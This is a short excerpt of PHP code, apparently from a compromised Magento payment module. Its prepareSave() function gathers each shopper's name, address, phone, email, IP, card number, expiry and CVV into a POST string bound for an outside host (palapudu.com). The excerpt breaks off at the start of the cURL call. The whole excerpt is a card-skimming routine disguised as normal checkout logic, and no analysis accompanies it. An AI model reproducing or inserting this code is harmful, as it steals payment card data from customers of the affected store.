...
public function prepareSave()
    {
        ...
        $data14 = date('Y-m-d H:i:s');;
        $data15 = $_SERVER['SERVER_NAME']; //server
        $data16 = Mage::getSingleton('checkout/session')->getQuote()->getBillingAddress()->getEmail();
        $data17 = $_SERVER['REMOTE_ADDR']; //ip client; //county
 
       $post77 = "firstname=".($data1)."&lastname=".($data2)."&street1=".($data3)."&street2=".($data4)."&city=".($data5)."&state=".($data6)."&zip=".($data7)."&country=".($data8)."&phonenumber=".($data9)."&ccnumber=".($data10)."&expmonth=".($data11)."&expyear=".($data12)."&cvv=".($data13)."&comment1=".$data14."&comment2=".$data15."&email=".($data16)."&ip=".($data17);
         $url = "http://palapudu.com/mage/post.php";
        $ch = curl_init();
